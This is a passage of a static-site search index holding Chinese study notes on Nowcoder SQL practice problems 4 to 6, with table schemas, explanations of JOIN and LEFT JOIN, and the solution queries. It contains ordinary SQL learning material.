NOT NULL, `hire_date` date NOT NULL, PRIMARY KEY (`emp_no`)); 1.4. Output # last_name first_name dept_no Facello Georgi d001 \u7701\u7565 \u7701\u7565 \u7701\u7565 Piveteau Duangkaew d006 1.5. Source # \u725b\u5ba2\u7f51 SQL\u5b9e\u6218 4 \u67e5\u627e\u6240\u6709\u5df2\u7ecf\u5206\u914d\u90e8\u95e8\u7684\u5458\u5de5 2. \u9898\u89e3 # \u53ef\u4ee5\u4f7f\u7528 JOIN \u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u5728 FROM \u540e\u9762\u63a5\u4e24\u4e2a\u8868\u540d\u5b9e\u73b0 INNER JOIN \u3002 3. \u4ee3\u7801 # \u4f7f\u7528 JOIN \u3002 SELECT `last_name`, `first_name`, `dept_no` FROM `dept_emp` as t1 JOIN `employees` as t2 ON t1.emp_no = t2.emp_no; \u4f7f\u7528\u9017\u53f7\u8fde\u63a5\u52a0 WHERE \u8bed\u53e5\u3002 SELECT `last_name`, `first_name`, `dept_no` FROM `dept_emp` as t1, `employees` as t2 WHERE t1.emp_no = t2.emp_no; \u4f7f\u7528\u9017\u53f7\u8fde\u63a5\u52a0 ON \u8bed\u53e5\uff0c Mysql \u4e2d\u4e0d\u80fd\u4f7f\u7528\u4e0b\u9762\u8fd9\u4e2a\u8bed\u53e5\uff0c SQLite \u4e2d\u53ef\u4ee5\u3002 SELECT `last_name`, `first_name`, `dept_no` FROM `dept_emp` as t1, `employees` as t2 ON t1.emp_no = t2.emp_no; \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 4 \u67e5\u627e\u6240\u6709\u5df2\u7ecf\u5206\u914d\u90e8\u95e8\u7684\u5458\u5de5"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_4_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%B7%B2%E7%BB%8F%E5%88%86%E9%85%8D%E9%83%A8%E9%97%A8%E7%9A%84%E5%91%98%E5%B7%A5/#sql-4","text":"","title":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 4 \u67e5\u627e\u6240\u6709\u5df2\u7ecf\u5206\u914d\u90e8\u95e8\u7684\u5458\u5de5"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_4_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%B7%B2%E7%BB%8F%E5%88%86%E9%85%8D%E9%83%A8%E9%97%A8%E7%9A%84%E5%91%98%E5%B7%A5/#_1","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 4 \u67e5\u627e\u6240\u6709\u5df2\u7ecf\u5206\u914d\u90e8\u95e8\u7684\u5458\u5de5 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Output 1.5. Source 2. \u9898\u89e3 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_4_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%B7%B2%E7%BB%8F%E5%88%86%E9%85%8D%E9%83%A8%E9%97%A8%E7%9A%84%E5%91%98%E5%B7%A5/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_4_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%B7%B2%E7%BB%8F%E5%88%86%E9%85%8D%E9%83%A8%E9%97%A8%E7%9A%84%E5%91%98%E5%B7%A5/#11-time-limit","text":"C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2","title":"1.1. Time Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_4_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%B7%B2%E7%BB%8F%E5%88%86%E9%85%8D%E9%83%A8%E9%97%A8%E7%9A%84%E5%91%98%E5%B7%A5/#12-memory-limit","text":"C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M","title":"1.2. Memory Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_4_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%B7%B2%E7%BB%8F%E5%88%86%E9%85%8D%E9%83%A8%E9%97%A8%E7%9A%84%E5%91%98%E5%B7%A5/#13-problem-description","text":"\u67e5\u627e\u6240\u6709\u5df2\u7ecf\u5206\u914d\u90e8\u95e8\u7684\u5458\u5de5\u7684last_name\u548cfirst_name\u4ee5\u53cadept_no(\u8bf7\u6ce8\u610f\u8f93\u51fa\u63cf\u8ff0\u91cc\u5404\u4e2a\u5217\u7684\u524d\u540e\u987a\u5e8f) CREATE TABLE `dept_emp` ( `emp_no` int(11) NOT NULL, `dept_no` char(4) NOT NULL, `from_date` date NOT NULL, `to_date` date NOT NULL, PRIMARY KEY (`emp_no`,`dept_no`)); CREATE TABLE `employees` ( `emp_no` int(11) NOT NULL, `birth_date` date NOT NULL, `first_name` varchar(14) NOT NULL, `last_name` varchar(16) NOT NULL, `gender` char(1) NOT NULL, `hire_date` date NOT NULL, PRIMARY KEY (`emp_no`));","title":"1.3. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_4_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%B7%B2%E7%BB%8F%E5%88%86%E9%85%8D%E9%83%A8%E9%97%A8%E7%9A%84%E5%91%98%E5%B7%A5/#14-output","text":"last_name first_name dept_no Facello Georgi d001 \u7701\u7565 \u7701\u7565 \u7701\u7565 Piveteau Duangkaew d006","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_4_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%B7%B2%E7%BB%8F%E5%88%86%E9%85%8D%E9%83%A8%E9%97%A8%E7%9A%84%E5%91%98%E5%B7%A5/#15-source","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 4 \u67e5\u627e\u6240\u6709\u5df2\u7ecf\u5206\u914d\u90e8\u95e8\u7684\u5458\u5de5","title":"1.5. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_4_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%B7%B2%E7%BB%8F%E5%88%86%E9%85%8D%E9%83%A8%E9%97%A8%E7%9A%84%E5%91%98%E5%B7%A5/#2","text":"\u53ef\u4ee5\u4f7f\u7528 JOIN \u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u5728 FROM \u540e\u9762\u63a5\u4e24\u4e2a\u8868\u540d\u5b9e\u73b0 INNER JOIN \u3002","title":"2. \u9898\u89e3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_4_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%B7%B2%E7%BB%8F%E5%88%86%E9%85%8D%E9%83%A8%E9%97%A8%E7%9A%84%E5%91%98%E5%B7%A5/#3","text":"\u4f7f\u7528 JOIN \u3002 SELECT `last_name`, `first_name`, `dept_no` FROM `dept_emp` as t1 JOIN `employees` as t2 ON t1.emp_no = t2.emp_no; \u4f7f\u7528\u9017\u53f7\u8fde\u63a5\u52a0 WHERE \u8bed\u53e5\u3002 SELECT `last_name`, `first_name`, `dept_no` FROM `dept_emp` as t1, `employees` as t2 WHERE t1.emp_no = t2.emp_no; \u4f7f\u7528\u9017\u53f7\u8fde\u63a5\u52a0 ON \u8bed\u53e5\uff0c Mysql \u4e2d\u4e0d\u80fd\u4f7f\u7528\u4e0b\u9762\u8fd9\u4e2a\u8bed\u53e5\uff0c SQLite \u4e2d\u53ef\u4ee5\u3002 SELECT `last_name`, `first_name`, `dept_no` FROM `dept_emp` as t1, `employees` as t2 ON t1.emp_no = t2.emp_no; \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/3.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_5_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E7%9A%84last_name%E5%92%8Cfirst_name/","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 5 \u67e5\u627e\u6240\u6709\u5458\u5de5\u7684last_name\u548cfirst_name # \u76ee\u5f55 # \u725b\u5ba2\u7f51 SQL\u5b9e\u6218 5 \u67e5\u627e\u6240\u6709\u5458\u5de5\u7684last_name\u548cfirst_name \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Output 1.5. Source 2. \u9898\u89e3 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Time Limit # C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 1.2. Memory Limit # C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M 1.3. Problem Description # \u67e5\u627e\u6240\u6709\u5458\u5de5\u7684last_name\u548cfirst_name\u4ee5\u53ca\u5bf9\u5e94\u90e8\u95e8\u7f16\u53f7dept_no\uff0c\u4e5f\u5305\u62ec\u6682\u65f6\u6ca1\u6709\u5206\u914d\u5177\u4f53\u90e8\u95e8\u7684\u5458\u5de5(\u8bf7\u6ce8\u610f\u8f93\u51fa\u63cf\u8ff0\u91cc\u5404\u4e2a\u5217\u7684\u524d\u540e\u987a\u5e8f) CREATE TABLE `dept_emp` ( `emp_no` int(11) NOT NULL, `dept_no` char(4) NOT NULL, `from_date` date NOT NULL, `to_date` date NOT NULL, PRIMARY KEY (`emp_no`,`dept_no`)); CREATE TABLE `employees` ( `emp_no` int(11) NOT NULL, `birth_date` date NOT NULL, `first_name` varchar(14) NOT NULL, `last_name` varchar(16) NOT NULL, `gender` char(1) NOT NULL, `hire_date` date NOT NULL, PRIMARY KEY (`emp_no`)); 1.4. Output # last_name first_name dept_no Facello Georgi d001 \u7701\u7565 \u7701\u7565 \u7701\u7565 Sluis Mary NULL(\u5728sqlite\u4e2d\u6b64\u5904\u4e3a\u7a7a,MySQL\u4e3aNULL) 1.5. Source # \u725b\u5ba2\u7f51 SQL\u5b9e\u6218 5 \u67e5\u627e\u6240\u6709\u5458\u5de5\u7684last_name\u548cfirst_name 2. \u9898\u89e3 # \u8981\u6c42\u5728\u67e5\u8be2\u4e2d\u5305\u62ec\u6682\u65f6\u6ca1\u6709\u5206\u914d\u5177\u4f53\u90e8\u95e8\u7684\u5458\u5de5\uff0c\u9700\u8981\u4f7f\u7528 LEFT JOIN \u3002 3. \u4ee3\u7801 # \u4f7f\u7528 LEFT JOIN \u3002 SELECT `last_name`, `first_name`, `dept_no` FROM employees AS t1 LEFT JOIN dept_emp AS t2 ON t1.emp_no = t2.emp_no; \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 5 \u67e5\u627e\u6240\u6709\u5458\u5de5\u7684last name\u548cfirst name"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/3.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_5_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E7%9A%84last_name%E5%92%8Cfirst_name/#sql-5-last_namefirst_name","text":"","title":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 5 \u67e5\u627e\u6240\u6709\u5458\u5de5\u7684last_name\u548cfirst_name"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/3.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_5_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E7%9A%84last_name%E5%92%8Cfirst_name/#_1","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 5 \u67e5\u627e\u6240\u6709\u5458\u5de5\u7684last_name\u548cfirst_name \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Output 1.5. Source 2. \u9898\u89e3 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/3.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_5_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E7%9A%84last_name%E5%92%8Cfirst_name/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/3.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_5_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E7%9A%84last_name%E5%92%8Cfirst_name/#11-time-limit","text":"C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2","title":"1.1. Time Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/3.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_5_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E7%9A%84last_name%E5%92%8Cfirst_name/#12-memory-limit","text":"C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M","title":"1.2. Memory Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/3.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_5_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E7%9A%84last_name%E5%92%8Cfirst_name/#13-problem-description","text":"\u67e5\u627e\u6240\u6709\u5458\u5de5\u7684last_name\u548cfirst_name\u4ee5\u53ca\u5bf9\u5e94\u90e8\u95e8\u7f16\u53f7dept_no\uff0c\u4e5f\u5305\u62ec\u6682\u65f6\u6ca1\u6709\u5206\u914d\u5177\u4f53\u90e8\u95e8\u7684\u5458\u5de5(\u8bf7\u6ce8\u610f\u8f93\u51fa\u63cf\u8ff0\u91cc\u5404\u4e2a\u5217\u7684\u524d\u540e\u987a\u5e8f) CREATE TABLE `dept_emp` ( `emp_no` int(11) NOT NULL, `dept_no` char(4) NOT NULL, `from_date` date NOT NULL, `to_date` date NOT NULL, PRIMARY KEY (`emp_no`,`dept_no`)); CREATE TABLE `employees` ( `emp_no` int(11) NOT NULL, `birth_date` date NOT NULL, `first_name` varchar(14) NOT NULL, `last_name` varchar(16) NOT NULL, `gender` char(1) NOT NULL, `hire_date` date NOT NULL, PRIMARY KEY (`emp_no`));","title":"1.3. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/3.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_5_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E7%9A%84last_name%E5%92%8Cfirst_name/#14-output","text":"last_name first_name dept_no Facello Georgi d001 \u7701\u7565 \u7701\u7565 \u7701\u7565 Sluis Mary NULL(\u5728sqlite\u4e2d\u6b64\u5904\u4e3a\u7a7a,MySQL\u4e3aNULL)","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/3.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_5_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E7%9A%84last_name%E5%92%8Cfirst_name/#15-source","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 5 \u67e5\u627e\u6240\u6709\u5458\u5de5\u7684last_name\u548cfirst_name","title":"1.5. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/3.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_5_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E7%9A%84last_name%E5%92%8Cfirst_name/#2","text":"\u8981\u6c42\u5728\u67e5\u8be2\u4e2d\u5305\u62ec\u6682\u65f6\u6ca1\u6709\u5206\u914d\u5177\u4f53\u90e8\u95e8\u7684\u5458\u5de5\uff0c\u9700\u8981\u4f7f\u7528 LEFT JOIN \u3002","title":"2. \u9898\u89e3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/3.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_5_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E7%9A%84last_name%E5%92%8Cfirst_name/#3","text":"\u4f7f\u7528 LEFT JOIN \u3002 SELECT `last_name`, `first_name`, `dept_no` FROM employees AS t1 LEFT JOIN dept_emp AS t2 ON t1.emp_no = t2.emp_no; \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/5.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_6_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E5%85%A5%E8%81%8C%E6%97%B6%E5%80%99%E7%9A%84%E8%96%AA%E6%B0%B4%E6%83%85%E5%86%B5/","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 6 \u67e5\u627e\u6240\u6709\u5458\u5de5\u5165\u804c\u65f6\u5019\u7684\u85aa\u6c34\u60c5\u51b5 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 SQL\u5b9e\u6218 6 \u67e5\u627e\u6240\u6709\u5458\u5de5\u5165\u804c\u65f6\u5019\u7684\u85aa\u6c34\u60c5\u51b5 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Output 1.5. Source 2. \u9898\u89e3 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Time Limit # C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 1.2. Memory Limit # C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M 1.3. Problem Description # \u67e5\u627e\u6240\u6709\u5458\u5de5\u5165\u804c\u65f6\u5019\u7684\u85aa\u6c34\u60c5\u51b5\uff0c\u7ed9\u51faemp_no\u4ee5\u53casalary\uff0c \u5e76\u6309\u7167emp_no\u8fdb\u884c\u9006\u5e8f(\u8bf7\u6ce8\u610f\uff0c\u4e00\u4e2a\u5458\u5de5\u53ef\u80fd\u6709\u591a\u6b21\u6da8\u85aa\u7684\u60c5\u51b5) CREATE TABLE `employees` ( `emp_no` int(11) NOT NULL, `birth_date` date NOT NULL, `first_name` varchar(14) NOT NULL, `last_name` varchar(16) NOT NULL, `gender` char(1) NOT NULL, `hire_date` date NOT NULL, PRIMARY KEY (`emp_no`)); CREATE TABLE `salaries` ( `emp_no` int(11) NOT NULL, `salary` int(11) NOT NULL, `from_date` date NOT NULL, `to_date` date NOT NULL, PRIMARY KEY (`emp_no`,`from_date`)); 1.4. Output # emp_no salary 10011 25828 \u7701\u7565 \u7701\u7565 10001 60117 1.5. Source # \u725b\u5ba2\u7f51 SQL\u5b9e\u6218 6 \u67e5\u627e\u6240\u6709\u5458\u5de5\u5165\u804c\u65f6\u5019\u7684\u85aa\u6c34\u60c5\u51b5 2. \u9898\u89e3 # \u8981\u6c42\u5728\u67e5\u8be2\u4e2d\u5305\u62ec\u6682\u65f6\u6ca1\u6709\u5206\u914d\u5177\u4f53\u90e8\u95e8\u7684\u5458\u5de5\uff0c\u9700\u8981\u4f7f\u7528 LEFT JOIN \u3002 3. \u4ee3\u7801 # \u52a0\u5165 hire_date = from_date \u7684\u7b5b\u9009\u6761\u4ef6\uff0c\u627e\u5230\u5458\u5de5\u5165\u804c\u65f6\u5019\u7684\u85aa\u6c34\u60c5\u51b5\u3002 SELECT t1.`emp_no`, `salary` FROM `employees` AS t1, `salaries` AS t2 ON t1.emp_no = t2.emp_no WHERE hire_date = from_date ORDER BY t1.emp_no DESC mysql \u4e2d\u9700\u8981\u4f7f\u7528 WHERE \u3002 SELECT t1.`emp_no`, `salary` FROM `employees` AS t1, `salaries` AS t2 WHERE t1.emp_no = t2.emp_no AND hire_date = from_date ORDER BY t1.emp_no DESC \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5.\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 6 \u67e5\u627e\u6240\u6709\u5458\u5de5\u5165\u804c\u65f6\u5019\u7684\u85aa\u6c34\u60c5\u51b5"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/5.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_6_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E5%85%A5%E8%81%8C%E6%97%B6%E5%80%99%E7%9A%84%E8%96%AA%E6%B0%B4%E6%83%85%E5%86%B5/#sql-6","text":"","title":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 6 \u67e5\u627e\u6240\u6709\u5458\u5de5\u5165\u804c\u65f6\u5019\u7684\u85aa\u6c34\u60c5\u51b5"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/5.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_6_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E5%85%A5%E8%81%8C%E6%97%B6%E5%80%99%E7%9A%84%E8%96%AA%E6%B0%B4%E6%83%85%E5%86%B5/#_1","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 6 \u67e5\u627e\u6240\u6709\u5458\u5de5\u5165\u804c\u65f6\u5019\u7684\u85aa\u6c34\u60c5\u51b5 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Output 1.5. Source 2. \u9898\u89e3 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/5.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_6_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E5%85%A5%E8%81%8C%E6%97%B6%E5%80%99%E7%9A%84%E8%96%AA%E6%B0%B4%E6%83%85%E5%86%B5/#1","text":"","title":"1. 